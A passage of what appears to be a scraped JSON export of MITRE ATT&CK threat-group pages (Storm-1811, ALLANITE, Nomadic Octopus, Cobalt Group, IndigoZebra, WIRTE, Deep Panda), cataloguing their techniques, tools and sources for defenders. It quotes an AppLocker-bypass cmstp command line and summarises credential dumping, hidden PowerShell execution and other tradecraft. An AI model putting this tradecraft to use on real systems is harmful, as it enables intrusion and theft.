Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0357 Impacket Storm-1811 has used Impacket for lateral movement activity.[2] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0029 PsExec Storm-1811 has used PsExec for remote process execution.[1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0650 QakBot Storm-1811 operations have included deployment of QakBot.[1] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Session Hijacking, Brute Force, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Domain Trust Discovery, Dynamic Resolution: Domain Generation Algorithms, Email Collection: Local Email Collection, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Exploitation of Remote Services, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade File Type, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Binary Padding, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information: HTML Smuggling, Obfuscated Files or Information: Command Obfuscation, Obfuscated Files or Information, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Software Packing, Peripheral Device Discovery, Permission Groups Discovery: Local Groups, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: External Proxy, Remote System Discovery, Replication Through Removable Media, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, Software Discovery, Steal Web Session Cookie, Subvert Trust Controls: Code Signing, Subvert Trust Controls: Mark-of-the-Web Bypass, System Binary Proxy Execution: Regsvr32, System Binary Proxy Execution: Msiexec, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery: Internet Connection Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Time Discovery, User Execution: Malicious Link, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks, Virtualization/Sandbox Evasion: Time Based Evasion, Windows Management Instrumentation S1209 Quick Assist Storm-1811 used Quick Assist as part of social engineering activity to interact with victims to install follow-on malicious software.[1] Application Layer Protocol: Web Protocols, Screen Capture, Video Capture References Microsoft Threat Intelligence. (2024, May 15). Threat actors misusing Quick Assist in social engineering attacks leading to ransomware. Retrieved March 14, 2025. Tyler McGraw, Thomas Elkins, and Evan McCann. (2024, May 10). Ongoing Social Engineering Campaign Linked to Black Basta Ransomware Operators. Retrieved January 31, 2025. Red Canary Intelligence. (2024, December 2). Storm-1811 exploits RMM tools to drop Black Basta ransomware. Retrieved March 14, 2025. The Red Canary Team. (2024, June 20). Intelligence Insights: June 2024. Retrieved March 14, 2025. "
},
{
"id": 106,
"title": "ALLANITE, Palmetto Fusion, Group G1000",
"path": "/groups/G1000/index.html",
"content": " ALLANITE ALLANITE is a suspected Russian cyber espionage group, that has primarily targeted the electric utility sector within the United States and United Kingdom. The group's tactics and techniques are reportedly similar to Dragonfly, although ALLANITEs technical capabilities have not exhibited disruptive or destructive abilities. It has been suggested that the group maintains a presence in ICS for the purpose of gaining understanding of processes and to maintain persistence. [1] ID: G1000 \u24d8 Associated Groups: Palmetto Fusion Contributors: Dragos Threat Intelligence Version: 1.0 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use ICS T0817 Drive-by Compromise ALLANITE leverages watering hole attacks to gain access into electric utilities. [2] ICS T0852 Screen Capture ALLANITE has been identified to collect and distribute screenshots of ICS systems such as HMIs. [1] [3] ICS T0865 Spearphishing Attachment ALLANITE utilized spear phishing to gain access into energy sector environments. [4] ICS T0859 Valid Accounts ALLANITE utilized credentials collected through phishing and watering hole attacks. [1] References Dragos Allanite Retrieved. 2019/10/27 Eduard Kovacs 2018, May 21 Group linked to Shamoon attacks targeting ICS networks in Middle East and UK Retrieved September 12, 2024. ICS-CERT 2017, October 21 Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors Retrieved. 2017/10/23 Jeff Jones 2018, May 10 Dragos Releases Details on Suspected Russian Infrastructure Hacking Team ALLANITE Retrieved. 2020/01/03 "
},
{
"id": 107,
"title": "Nomadic Octopus, DustSquad, Group G0133",
"path": "/groups/G0133/index.html",
"content": " Nomadic Octopus Nomadic Octopus is a Russian-speaking cyber espionage threat group that has primarily targeted Central Asia, including local governments, diplomatic missions, and individuals, since at least 2014. Nomadic Octopus has been observed conducting campaigns involving Android and Windows malware, mainly using the Delphi programming language, and building custom variants.[1][2][3] ID: G0133 \u24d8 Associated Groups: DustSquad Version: 1.0 Created: 24 August 2021 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description DustSquad [1][2][4] Techniques Used Domain ID Name Use Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Nomadic Octopus has used PowerShell for execution.[3] .003 Command and Scripting Interpreter: Windows Command Shell Nomadic Octopus used cmd.exe /c within a malicious macro.[3] Enterprise T1564 .003 Hide Artifacts: Hidden Window Nomadic Octopus executed PowerShell in a hidden window.[3] Enterprise T1105 Ingress Tool Transfer Nomadic Octopus has used malicious macros to download additional files to the victim's machine.[3] Enterprise T1036 Masquerading Nomadic Octopus attempted to make Octopus appear as a Telegram Messenger with a Russian interface.[2] Enterprise T1566 .001 Phishing: Spearphishing Attachment Nomadic Octopus has targeted victims with spearphishing emails containing malicious attachments.[1][3] Enterprise T1204 .002 User Execution: Malicious File Nomadic Octopus as attempted to lure victims into clicking on malicious attachments within spearphishing emails.[2][3] Software ID Name References Techniques S0340 Octopus [1][2][3] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Data Encoding: Standard Encoding, Data from Local System, Data Staged: Local Data Staging, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Phishing: Spearphishing Attachment, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, User Execution: Malicious File, Windows Management Instrumentation References Paganini, P. (2018, October 16). Russia-linked APT group DustSquad targets diplomatic entities in Central Asia. Retrieved August 24, 2021. Kaspersky Lab's Global Research & Analysis Team. (2018, October 15). Octopus-infested seas of Central Asia. Retrieved November 14, 2018. Cherepanov, A. (2018, October 4). Nomadic Octopus Cyber espionage in Central Asia. Retrieved October 13, 2021. Kovacs, E. (2018, October 18). Russia-Linked Hackers Target Diplomatic Entities in Central Asia. Retrieved October 13, 2021. "
},
{
"id": 108,
"title": "Cobalt Group, GOLD KINGSWOOD, Cobalt Gang, Cobalt Spider, Group G0080",
"path": "/groups/G0080/index.html",
"content": " Cobalt Group Cobalt Group is a financially motivated threat group that has primarily targeted financial institutions since at least 2016. The group has conducted intrusions to steal money via targeting ATM systems, card processing, payment systems and SWIFT systems. Cobalt Group has mainly targeted banks in Eastern Europe, Central Asia, and Southeast Asia. One of the alleged leaders was arrested in Spain in early 2018, but the group still appears to be active. The group has been known to target organizations in order to use their access to then compromise additional victims.[1][2][3][4][5][6][7] Reporting indicates there may be links between Cobalt Group and both the malware Carbanak and the group Carbanak.[8] ID: G0080 \u24d8 Associated Groups: GOLD KINGSWOOD, Cobalt Gang, Cobalt Spider Version: 2.1 Created: 17 October 2018 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description GOLD KINGSWOOD [9] Cobalt Gang [1] [10][11] Cobalt Spider [10] Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control Cobalt Group has bypassed UAC.[4] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Cobalt Group has used HTTPS for C2.[1][3][4] .004 Application Layer Protocol: DNS Cobalt Group has used DNS tunneling for C2.[1][3][4] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Cobalt Group has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.[4] Enterprise T1037 .001 Boot or Logon Initialization Scripts: Logon Script (Windows) Cobalt Group has added persistence by registering the file name for the next stage malware under HKCU\\Environment\\UserInitMprLogonScript.[11] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Cobalt Group has used powershell.exe to download and execute scripts.[1][2][3][4][7][12] .003 Command and Scripting Interpreter: Windows Command Shell Cobalt Group has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands.[11] The group has used an exploit toolkit known as Threadkit that launches .bat files.[1][2][4][11][13][12] .005 Command and Scripting Interpreter: Visual Basic Cobalt Group has sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.[1][2][4][11][13][12] .007 Command and Scripting Interpreter: JavaScript Cobalt Group has executed JavaScript scriptlets on the victim's machine.[1][2][4][11][13][12] Enterprise T1543 .003 Create or Modify System Process: Windows Service Cobalt Group has created new services to establish persistence.[4] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography Cobalt Group has used the Plink utility to create SSH tunnels.[4] Enterprise T1203 Exploitation for Client Execution Cobalt Group had exploited multiple vulnerabilities for execution, including Microsoft\u2019s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.[1][2][3][5][6][7][10][12] Enterprise T1068 Exploitation for Privilege Escalation Cobalt Group has used exploits to increase their levels of rights and privileges.[4] Enterprise T1070 .004 Indicator Removal: File Deletion Cobalt Group deleted the DLL dropper from the victim\u2019s machine to cover their tracks.[1] Enterprise T1105 Ingress Tool Transfer Cobalt Group has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.[2][3] The group's JavaScript backdoor is also capable of downloading files.[11] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange Cobalt Group has sent malicious Word OLE compound documents to victims.[1] Enterprise T1046 Network Service Discovery Cobalt Group leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.[2][3][4] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation Cobalt Group obfuscated several scriptlets and code used on the victim\u2019s machine, including through use of XOR and RC4.[1][11] Enterprise T1588 .002 Obtain Capabilities: Tool Cobalt Group has obtained and used a variety of tools including Mimikatz, PsExec, Cobalt Strike, and SDelete.[3] Enterprise T1566 .001 Phishing: Spearphishing Attachment Cobalt Group has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.[1][2][3][4][5][6][13][12] .002 Phishing: Spearphishing Link Cobalt Group has sent emails with URLs pointing to malicious documents.[1][9] Enterprise T1055 Process Injection Cobalt Group has injected code into trusted processes.[4] Enterprise T1572 Protocol Tunneling Cobalt Group has used the Plink utility to create SSH tunnels.[1][3][4] Enterprise T1219 Remote Access Tools Cobalt Group used the Ammyy Admin tool as well as TeamViewer for remote access, including to preserve remote access if a Cobalt Strike module was lost.[2][3][4] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Cobalt Group has used Remote Desktop Protocol to conduct lateral movement.[4] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Cobalt Group has created Windows tasks to establish persistence.[4] Enterprise T1518 .001 Software Discovery: Security Software Discovery Cobalt Group used a JavaScript backdoor that is capable of collecting a list of the security solutions installed on the victim's machine.[11] Enterprise T1195 .002 Supply Chain Compromise: Compromise Software Supply Chain Cobalt Group has compromised legitimate web browser updates to deliver a backdoor. [14] Enterprise T1218 .003 System Binary Proxy Execution: CMSTP Cobalt Group has used the command cmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txt to bypass AppLocker and launch a malicious script.[1][11][13] .008 System Binary Proxy Execution: Odbcconf Cobalt Group has used odbcconf to proxy the execution of malicious DLL files.[12] .010 System Binary Proxy Execution: Regsvr32 Cobalt Group has used regsvr32.exe to execute scripts.[1][11][12] Enterprise T1204 .001 User Execution: Malicious Link Cobalt Group has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine.[1][13][9] .002 User Execution: Malicious File Cobalt Group has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine.[1][13] Enterprise T1220 XSL Script Processing Cobalt Group used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.[1] Software ID Name References Techniques S0154 Cobalt Strike [1][2][4][5] [6][7][10][12] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0002 Mimikatz [2][3][4] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0284 More_eggs [1][14] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Software Discovery: Security Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Network Configuration Discovery: Internet Connection Discovery, System Network Configuration Discovery, System Owner/User Discovery S0029 PsExec [2][4] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0195 SDelete [3] Data Destruction, Indicator Removal: File Deletion S0646 SpicyOmelette [9] Command and Scripting Interpreter: JavaScript, Data from Local System, Ingress Tool Transfer, Phishing: Spearphishing Link, Remote System Discovery, Software Discovery, Software Discovery: Security Software Discovery, Subvert Trust Controls: Code Signing, System Information Discovery, System Network Configuration Discovery, User Execution: Malicious Link References Svajcer, V. (2018, July 31). Multiple Cobalt Personality Disorder. Retrieved September 5, 2018. Positive Technologies. (2017, August 16). Cobalt Strikes Back: An Evolving Multinational Threat to Finance. Retrieved September 5, 2018. Positive Technologies. (2016, December 16). Cobalt Snatch. Retrieved October 9, 2018. Matveeva, V. (2017, August 15). Secrets of Cobalt. Retrieved October 10, 2018. Mesa, M, et al. (2017, June 1). Microsoft Word Intruder Integrates CVE-2017-0199, Utilized by Cobalt Group to Target Financial Institutions. Retrieved October 10, 2018. Klijnsma, Y.. (2017, November 28). Gaffe Reveals Full List of Targets in Spear Phishing Attack Using Cobalt Strike Against Financial Institutions. Retrieved October 10, 2018. Klijnsma, Y.. (2018, January 16). First Activities of Cobalt Group in 2018: Spear Phishing Russian Banks. Retrieved October 10, 2018. Europol. (2018, March 26). Mastermind Behind EUR 1 Billion Cyber Bank Robbery Arrested in Spain. Retrieved October 10, 2018. CTU. (2018, September 27). Cybercriminals Increasingly Trying to Ensnare the Big Financial Fish. Retrieved September 20, 2021. CrowdStrike. (2018, February 26). CrowdStrike 2018 Global Threat Report. Retrieved October 10, 2018. Gorelik, M. (2018, October 08). Cobalt Group 2.0. Retrieved November 5, 2018. Giagone, R., Bermejo, L., and Yarochkin, F. (2017, November 20). Cobalt Strikes Again: Spam Runs Use Macros and CVE-2017-8759 Exploit Against Russian Banks. Retrieved March 7, 2019. Unit 42. (2018, October 25). New Techniques to Uncover and Attribute Financial actors Commodity Builders and Infrastructure Revealed. Retrieved December 11, 2018. Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020. "
},
{
"id": 109,
"title": "IndigoZebra, Group G0136",
"path": "/groups/G0136/index.html",
"content": " IndigoZebra IndigoZebra is a suspected Chinese cyber espionage group that has been targeting Central Asian governments since at least 2014.[1][2][3] ID: G0136 Contributors: Pooja Natarajan, NEC Corporation India; Yoshihiro Kori, NEC Corporation; Manikantan Srinivasan, NEC Corporation India Version: 1.0 Created: 24 September 2021 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains IndigoZebra has established domains, some of which were designed to look like official government domains, for their operations.[2] .006 Acquire Infrastructure: Web Services IndigoZebra created Dropbox accounts for their operations.[1][2] Enterprise T1586 .002 Compromise Accounts: Email Accounts IndigoZebra has compromised legitimate email accounts to use in their spearphishing operations.[2] Enterprise T1105 Ingress Tool Transfer IndigoZebra has downloaded additional files and tools from its C2 server.[2] Enterprise T1588 .002 Obtain Capabilities: Tool IndigoZebra has acquired open source tools such as NBTscan and Meterpreter for their operations.[2][3] Enterprise T1566 .001 Phishing: Spearphishing Attachment IndigoZebra sent spearphishing emails containing malicious password-protected RAR attachments.[1][2] Enterprise T1204 .002 User Execution: Malicious File IndigoZebra sent spearphishing emails containing malicious attachments that urged recipients to review modifications in the file which would trigger the attack.[1] Software ID Name References Techniques S0651 BoxCaon [2] Boot or Logon Autostart Execution, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Data Staged: Local Data Staging, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery, Ingress Tool Transfer, Native API, Obfuscated Files or Information, System Network Configuration Discovery, Web Service: Bidirectional Communication S0012 PoisonIvy [3] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit S0653 xCaon [2] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Native API, Software Discovery: Security Software Discovery, System Network Configuration Discovery References Lakshmanan, R.. (2021, July 1). IndigoZebra APT Hacking Campaign Targets the Afghan Government. Retrieved September 24, 2021. CheckPoint Research. (2021, July 1). IndigoZebra APT continues to attack Central Asia with evolving tools. Retrieved September 24, 2021. Kaspersky Lab's Global Research & Analysis Team. (2017, August 8). APT Trends report Q2 2017. Retrieved February 15, 2018. "
},
{
"id": 110,
"title": "WIRTE, Group G0090",
"path": "/groups/G0090/index.html",
"content": " WIRTE WIRTE is a threat group that has been active since at least August 2018. WIRTE has targeted government, diplomatic, financial, military, legal, and technology organizations in the Middle East and Europe.[1][2] ID: G0090 Contributors: Lab52 by S2 Grupo Version: 2.0 Created: 24 May 2019 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols WIRTE has used HTTP for network communication.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell WIRTE has used PowerShell for script execution.[1] .005 Command and Scripting Interpreter: Visual Basic WIRTE has used VBScript in its operations.[1] Enterprise T1140 Deobfuscate/Decode Files or Information WIRTE has used Base64 to decode malicious VBS script.[1] Enterprise T1105 Ingress Tool Transfer WIRTE has downloaded PowerShell code from the C2 server to be executed.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location WIRTE has named a first stage dropper Kaspersky Update Agent in order to appear legitimate.[2] Enterprise T1571 Non-Standard Port WIRTE has used HTTPS over ports 2083 and 2087 for C2.[2] Enterprise T1588 .002 Obtain Capabilities: Tool WIRTE has obtained and used Empire for post-exploitation activities.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment WIRTE has sent emails to intended victims with malicious MS Word and Excel attachments.[2] Enterprise T1218 .010 System Binary Proxy Execution: Regsvr32 WIRTE has used regsvr32.exe to trigger the execution of a malicious script.[1] Enterprise T1204 .002 User Execution: Malicious File WIRTE has attempted to lure users into opening malicious MS Word and Excel files to execute malicious payloads.[2] Software ID Name References Techniques S0363 Empire [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0679 Ferocious [2] Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Event Triggered Execution: Component Object Model Hijacking, Indicator Removal: File Deletion, Modify Registry, Peripheral Device Discovery, Software Discovery: Security Software Discovery, System Information Discovery, Virtualization/Sandbox Evasion: System Checks S0680 LitePower [2] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: PowerShell, Exfiltration Over C2 Channel, Ingress Tool Transfer, Native API, Query Registry, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, System Information Discovery, System Owner/User Discovery References S2 Grupo. (2019, April 2). WIRTE Group attacking the Middle East. Retrieved May 24, 2019. Yamout, M. (2021, November 29). WIRTE\u2019s campaign in the Middle East \u2018living off the land\u2019 since at least 2019. Retrieved February 1, 2022. "
},
{
"id": 111,
"title": "Deep Panda, Shell Crew, WebMasters, KungFu Kittens, PinkPanther, Black Vine, Group G0009",
"path": "/groups/G0009/index.html",
"content": " Deep Panda Deep Panda is a suspected Chinese threat group known to target many industries, including government, defense, financial, and telecommunications. [1] The intrusion into healthcare company Anthem has been attributed to Deep Panda. [2] This group is also known as Shell Crew, WebMasters, KungFu Kittens, and PinkPanther. [3] Deep Panda also appears to be known as Black Vine based on the attribution of both group names to the Anthem intrusion. [4] Some analysts track Deep Panda and APT19 as the same group, but it is unclear from open source information if the groups are the same. [5] ID: G0009 \u24d8 Associated Groups: Shell Crew, WebMasters, KungFu Kittens, PinkPanther, Black Vine Contributors: Andrew Smith, @jakx_ Version: 1.2 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Shell Crew [3] WebMasters [3] KungFu Kittens [3] PinkPanther [3] Black Vine [4] Techniques Used Domain ID Name Use Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Deep Panda has used PowerShell scripts to download and execute programs in memory, without writing to disk.[1] Enterprise T1546 .008 Event Triggered Execution: Accessibility Features Deep Panda has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.[3] Enterprise T1564 .003 Hide Artifacts: Hidden Window Deep Panda has used -w hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. [1] Enterprise T1027 .005 Obfuscated Files or Information: Indicator Removal from Tools Deep Panda has updated and modified its malware, resulting in different hash values that evade detection.[4] Enterprise T1057 Process Discovery Deep Panda uses the Microsoft Tasklist utility to list processes running on systems.[1] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Deep Panda uses net.exe to connect to network shares using net use commands with compromised credentials.[1] Enterprise T1018 Remote System Discovery Deep Panda has used ping to identify other machines of interest.[1] Enterprise T1505 .003 Server Software Component: Web Shell Deep Panda uses Web shells on publicly accessible Web servers to access victim networks.[6] Enterprise T1218 .010 System Binary Proxy Execution: Regsvr32 Deep Panda has used regsvr32.exe to execute a server variant of Derusbi in victim networks.[3] Enterprise T1047 Windows Management Instrumentation The Deep Panda group is known to utilize WMI for lateral movement.[1] Software ID Name References Techniques S0021 Derusbi [2] Audio Capture, Command and Scripting Interpreter: Unix Shell, Encrypted Channel: Symmetric Cryptography, Fallback Channels, File and Directory Discovery, Indicator Removal: Timestomp, Indicator Removal: File Deletion, Input Capture: Keylogging, Non-Application Layer Protocol, Non-Standard Port, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Screen Capture, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Owner/User Discovery, Video Capture S0080 Mivast [4] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Ingress Tool Transfer, OS Credential Dumping: Security Account Manager S0039 Net [1] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0097 Ping [1] Remote System Discovery S0074 Sakula [2] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: 